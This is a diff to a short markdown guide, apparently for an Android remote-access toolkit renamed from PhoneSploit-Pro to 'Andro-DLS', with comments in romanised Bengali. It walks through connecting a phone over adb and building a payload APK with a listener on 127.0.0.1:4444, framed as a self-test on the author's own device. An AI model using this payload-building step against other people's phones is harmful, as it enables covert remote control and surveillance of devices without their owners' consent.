@@ -1,11 +1,11 @@
-# 🚀 PhoneSploit-Pro — Self-Test & Remote Access Guide
+# 🚀 Andro-DLS — Self-Test & Remote Access Guide
 **(Verified working 2026-08-26 — Infinix X6880, Android 15)**
 
 ## PART 1 — Quick Test (USB / same LAN)
 
 ### Step 1: Connect + verify
 ```bash
-cd ~/geek\>div/tools-haydra/PhoneSploit-Pro
+cd ~/geek\>div/tools-haydra/Andro-DLS
 adb devices                 # serial dekhbe e.g. 131943851C004595
 ```
 
@@ -15,7 +15,7 @@ adb devices                 # serial dekhbe e.g. 131943851C004595
 ~/.venv/bin/python phonesploitpro.py   # app explore korar jonno (optional)
 
 # payload build (FGS = battery-killer safe)
-cd ~/geek\>div/tools-haydra/PhoneSploit-Pro
+cd ~/geek\>div/tools-haydra/Andro-DLS
 ./build_payload.sh --fgs 127.0.0.1 4444 /tmp/test-me.apk
 
 # install on phone (USB)
